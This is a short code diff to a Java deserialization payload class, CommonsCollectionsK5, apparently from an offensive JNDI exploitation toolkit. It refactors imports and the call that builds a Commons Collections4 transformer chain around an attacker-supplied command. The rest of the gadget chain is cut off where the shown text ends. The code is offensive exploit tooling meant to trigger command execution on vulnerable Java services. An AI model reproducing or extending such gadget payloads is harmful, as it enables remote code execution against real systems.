@@ -1,9 +1,8 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Reflections;
-import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil4;
+import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.map.LazyMap;
@@ -13,12 +12,12 @@ import java.util.Hashtable;
 import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:4.0"})
-public class CommonsCollectionsK5 implements ObjectPayload<Hashtable>{
+public class CommonsCollectionsK5 implements ObjectPayload<Hashtable> {
 
     public Hashtable getObject(String command) throws Exception {
-        
+
         final Transformer   transformerChain = new ChainedTransformer(new Transformer[]{});
-        final Transformer[] transformers     = TransformerUtil4.makeTransformer4(command);
+        final Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
         Map                 innerMap1        = new HashMap();
         Map                 innerMap2        = new HashMap();
 
